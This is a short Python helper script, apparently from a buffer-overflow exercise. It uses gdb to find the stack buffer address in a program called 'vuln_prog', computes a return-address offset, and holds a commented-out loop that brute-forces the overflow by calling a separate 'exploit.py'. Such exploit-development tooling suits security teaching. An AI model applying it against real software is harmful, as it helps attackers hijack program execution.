#!/usr/bin/python3
import os

# creating script for gdb
fp = open("gdb_script","w")
fp.write("b bof\nrun\np &buffer\nq\n")
fp.close()

# creating a badfile for debugging
os.system("touch badfile")

# getting address of buffer from gdb
os.system("gdb vuln_prog --command=gdb_script>buffer_addr")
fp = open("buffer_addr",'r')
text=fp.readlines()
fp.close()

# addess of buffer in hex string
hexstr=text[-1][-11:-1]
hexint=int(text[-1][-11:-1], 16)
offset=hexint+492
print(hexstr,'\t')
print(offset)

# performing buffer overflow
#print("Initiating Scripted BufferOveflow")
'''
for i in range(4, 488):
	print("...")
	os.system("./exploit.py "+str(i) +" "+str(offset))
	os.system("./vuln_prog")
'''

